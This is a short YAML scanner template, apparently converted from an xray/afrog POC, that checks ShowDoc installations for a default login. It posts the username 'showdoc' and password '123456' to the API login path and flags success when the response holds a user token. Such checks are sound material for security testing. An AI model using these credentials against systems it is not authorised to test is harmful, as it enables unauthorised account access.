# 来源: xray（转换自 afrog/xray 表达式 POC）
http:
  - body: username=showdoc&password=123456
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - uid
          - groupid
          - user_token
        condition: and
    method: POST
    path:
      - '{{BaseURL}}/server/index.php?s=/api/user/login'
id: showdoc-default-password
